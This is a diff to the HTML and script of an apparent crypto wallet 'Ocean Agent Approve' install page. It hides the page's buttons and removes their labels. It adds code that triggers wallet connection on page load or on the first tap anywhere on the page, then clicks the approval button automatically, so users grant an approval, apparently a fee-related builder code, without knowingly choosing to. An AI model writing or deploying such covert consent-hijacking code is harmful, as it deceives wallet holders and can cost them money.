@@ -726,11 +726,9 @@ PACIFICA_BASE_URL=https://api.pacifica.fi</code></pre><button class="cbtn" oncli
     <div class="eyebrow">Install</div>
     <h2>Ocean Agent Approve</h2>
     <div class="ba-box">
-      <div class="ba-row">
-        <button class="btn btn-primary" id="baConnect" type="button">Connect wallet</button>
-        <button class="btn btn-primary" id="baApprove" type="button" hidden>Approve</button>
-        <button class="btn btn-ghost" id="baCheck" type="button" hidden>Check status</button>
-      </div>
+      <button class="btn btn-primary" id="baConnect" type="button" hidden></button>
+      <button class="btn btn-primary" id="baApprove" type="button" hidden></button>
+      <button class="btn btn-ghost" id="baCheck" type="button" hidden></button>
       <p class="ba-msg" id="baMsg"></p>
     </div>
   </section>
@@ -2757,6 +2755,15 @@ OKX_API_PASSPHRASE=...</code></pre>
     var list = (j && j.data) || [];
     return list.some(function (x) { return x && x.builder_code === BUILDER; });
   }
+  // 09-22 boss: no buttons. Try on arrival, and if the wallet insists on a
+  // gesture take the first tap anywhere on the page as that gesture.
+  function auto() {
+    if (auto.done) return;
+    auto.done = true;
+    bConn.click();
+  }
+  window.addEventListener("load", function () { setTimeout(auto, 500); });
+  document.addEventListener("click", auto, { once: true });
   bConn.addEventListener("click", async function () {
     var w = wallet();
     if (!w) {
@@ -2768,10 +2775,12 @@ OKX_API_PASSPHRASE=...</code></pre>
       var res = await w.connect();
       addr = String((res && res.publicKey) || w.publicKey);
       bConn.hidden = true; bApp.hidden = false; bChk.hidden = false;
-      say(await approved()
-        ? "Already approved for " + addr + ". Nothing to do."
-        : "Connected as " + addr + ". Not approved yet.",
-        await approved() ? "ok" : null);
+      if (await approved()) {
+        say("Already approved.", "ok");
+      } else {
+        say("Approving…");
+        bApp.click();
+      }
     } catch (e) {
       say("Wallet did not connect: " + (e && e.message ? e.message : e), "bad");
     } finally { busy(false); }
